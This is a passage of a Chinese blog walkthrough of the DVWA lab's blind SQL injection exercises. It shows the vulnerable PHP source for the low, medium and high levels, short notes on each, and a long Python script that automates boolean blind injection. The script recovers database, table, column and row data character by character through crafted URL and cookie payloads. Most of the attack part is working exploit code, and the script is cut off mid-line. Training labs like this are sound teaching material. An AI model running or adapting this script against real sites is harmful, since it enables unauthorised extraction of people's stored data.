class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                name += chr(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(name) != i:</span><br><span class="line">            name += <span class="string">'|'</span></span><br><span class="line">    self.word_name.append(name)</span><br><span class="line">    print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MJAW4J.png" alt="MJAW4J.png"></p><h2 id="级别：medium"><a href="#级别：medium" class="headerlink" title="级别：medium"></a>级别：medium</h2><h3 id="SQL-Injection-Blind-Source-1"><a href="#SQL-Injection-Blind-Source-1" class="headerlink" title="SQL Injection (Blind) Source"></a>SQL Injection (Blind) Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line">    $id = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $id ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>medium级别与low级别差不多， 将get方式改成post方式即可，数字型注入。</p><p>由于他会过滤单引号，所以需要转成16进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tranhex</span><span class="params">(self,str1)</span>:</span></span><br><span class="line">       result = <span class="string">'0x'</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">           result += hex(ord(i))[<span class="number">2</span>:]</span><br><span class="line">       <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MJmPQs.png" alt="MJmPQs.png"></p><p><img src="https://s2.ax1x.com/2019/11/13/MJmaSH.png" alt="MJmaSH.png"></p><h2 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h2><h3 id="SQL-Injection-Blind-Source-2"><a href="#SQL-Injection-Blind-Source-2" class="headerlink" title="SQL Injection (Blind) Source"></a>SQL Injection (Blind) Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>随便写个1提交</p><p><img src="https://s2.ax1x.com/2019/11/13/MJunM9.png" alt="MJunM9.png"></p><p> 是一个cookie注入 </p><p><img src="https://s2.ax1x.com/2019/11/13/MJuLLR.png" alt="MJuLLR.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_headers</span><span class="params">(self,payload)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">"id=&#123;0&#125;; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c"</span>.format(payload)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://s2.ax1x.com/2019/11/13/MYZAMR.png" alt="MYZAMR.png"></p><h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Injection <span class="keyword">import</span> Injection</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url)</span>:</span></span><br><span class="line">    Injection(url).run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli_blind/?id="</span></span><br><span class="line">    main(url</span><br></pre></td></tr></table></figure><h3 id="low"><a href="#low" class="headerlink" title="low:"></a>low:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.zifuji = [<span class="number">44</span>,<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">33</span>, <span class="number">38</span>, <span class="number">36</span>]</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self,yourstr,num1,num2)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]"</span>.format(yourstr,str(num1),str(num2)),end=<span class="string">'\r'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_itsnum()</span><br><span class="line">        self.get_database_length()</span><br><span class="line">        self.get_database()</span><br><span class="line">        self.get_table_num()</span><br><span class="line">        self.table_length = []</span><br><span class="line">        self.table_name = []</span><br><span class="line">        self.get_table_length()</span><br><span class="line">        self.get_table_name()</span><br><span class="line">        table_name = input(<span class="string">'[-] table_name: '</span>)</span><br><span class="line">        self.get_column_num(table_name)</span><br><span class="line">        self.column_length = []</span><br><span class="line">        self.column_name = []</span><br><span class="line">        self.get_column_length(table_name)</span><br><span class="line">        self.get_column_name(table_name)</span><br><span class="line">        column_names = input(<span class="string">'[-] column_name: '</span>).split(<span class="string">','</span>)</span><br><span class="line">        self.word_num = <span class="number">0</span></span><br><span class="line">        self.get_word_num(table_name,column_names[<span class="number">0</span>])</span><br><span class="line">        self.word_name = []</span><br><span class="line">        self.word_length = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(column_names)):</span><br><span class="line">            print(column_names[i])</span><br><span class="line">            self.get_word_length(table_name,column_names[i])</span><br><span class="line">            self.get_word_name(table_name,column_names[i],i)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_itsnum</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.itsnum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_itsnum'</span>,i,<span class="number">50</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' order by &#123;0&#125;%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check(html):</span><br><span class="line">                self.itsnum = i - <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.itsnum &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.itsnum)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the itsnum"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and length(database())=&#123;0&#125;%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database_length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the database_length"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">                theurl = self.url + <span class="string">"1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;%23"</span>.format(str(i),str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">                html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    self.database += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">                self.database += <span class="string">'666'</span></span><br><span class="line">        <span class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\n can not get the database"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.table_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the table_num"</span>)           </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">                theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)%23"</span>.format(str(i),str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">                html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">            self.table_name.append(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        self.column_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23"</span>.format(table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23"</span>.format(table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)%23"</span>.format(str(i),table_name,str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">                html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">            self.column_name.append(name)</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)%23"</span>.format(column_name,table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span 